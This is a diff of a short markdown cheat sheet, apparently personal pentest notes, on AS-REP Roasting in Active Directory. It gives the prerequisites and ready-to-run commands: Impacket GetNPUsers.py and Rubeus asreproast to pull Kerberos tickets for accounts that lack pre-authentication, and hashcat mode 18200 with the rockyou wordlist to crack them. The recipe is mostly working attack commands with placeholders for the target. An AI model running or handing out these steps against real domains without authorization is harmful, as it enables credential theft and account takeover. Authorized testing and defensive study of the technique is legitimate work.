@@ -1,23 +1,23 @@
-# Active Directory AS-REP Roasting
+# AS-REP Roasting
 
-*Requirements :*   
-Valid usernames list
-
-
-# Retrieve TGT 
-## Using Impacket
+***Requirements :***   
+- Valid usernames list
+- AD Users with **DONT_REQUIRE_PREAUTH** set
+## Retrieve TGT 
+### Using Impacket
+On the attacket shell
 ```bash
-# On the local machine
 GetNPUsers.py <TARGET DOMAIN>/ -dc-ip <DC IP>  -usersfile <USERLIST> -no-pass
 ```
 
-## Using Rubeus
+### Using Rubeus
+Via the target machine shell
+
 ```cmd
-:: Directly from the target machine
 Rubeus.exe asreproast 
 ```
 
-## Crack TGTs \ hashcat
+## Crack TGTs \\w hashcat
 
 ```bash
 hashcat -a 0 -m 18200 <HASH FILE> /usr/share/wordlists/rockyou.txt
